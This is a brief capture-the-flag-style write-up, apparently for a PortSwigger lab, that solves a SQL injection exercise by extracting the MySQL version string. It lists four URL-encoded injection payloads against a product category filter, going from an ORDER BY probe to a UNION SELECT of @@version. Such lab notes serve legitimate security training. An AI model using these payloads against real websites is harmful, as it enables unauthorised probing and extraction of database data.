
# 4 - SQL injection attack, querying the database type and version on MySQL and Microsoft

This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.

To solve the lab, display the database version string. (Make the database retrieve the string: '8.0.32-0ubuntu0.20.04.2')

---------------------------------------------

Reference: https://portswigger.net/web-security/sql-injection/cheat-sheet

---------------------------------------------
/filter?category=Gifts'+order+by+1--+
/filter?category=Gifts'+union+select NULL,NULL--+
/filter?category=Gifts'+union+select 'A',NULL--+
/filter?category=Gifts'+union+select @@version,NULL--+

``` 

![img](images/SQL%20injection%20attack,%20querying%20the%20database%20type%20and%20version%20on%20MySQL%20and%20Microsoft/1.png)
